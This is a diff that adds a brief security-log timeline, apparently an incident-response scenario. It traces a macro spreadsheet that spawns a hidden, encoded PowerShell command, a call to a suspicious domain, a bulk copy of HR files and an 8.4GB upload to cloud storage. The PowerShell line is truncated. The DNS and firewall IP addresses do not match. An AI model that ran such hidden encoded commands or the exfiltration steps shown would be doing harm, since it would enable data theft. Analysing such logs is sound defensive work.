@@ -1,0 +1,18 @@
+-- 메일 GW (08:44) --
+RECV: invoice_Q4.xlsm (DKIM:FAIL, VT:5/94)
+To: accounts@acme.co.kr
+-- ERD (09:03) --
+EXCEL.EXE -> wscript.exe -> powershell.exe
+-w hidden -enc c31zdGVtKCdubC...
+-- DNS (09:04) --
+QUERY: cdn-update-api.net (Age: 3days, VT:15/94)
+RESP: 44.77.88.12
+-- Firewall (09:05) --
+ALLOW: 10.0.0.22->45.77.88.12:443
+Duration: 4h12m | TX: 1.2MB | RX: 847MB
+-- File Audit (13:22) --
+COPY \\filesvr\HR\* -> C:\Users\Public\tmp\
+Files: 2,140 | Size: 8.4GB
+-- Proxy (13:58) --
+UPLOAD: drive.google.com/UPLOAD
+archive.zip 8.4GB | User: accounts@acme.co.kr
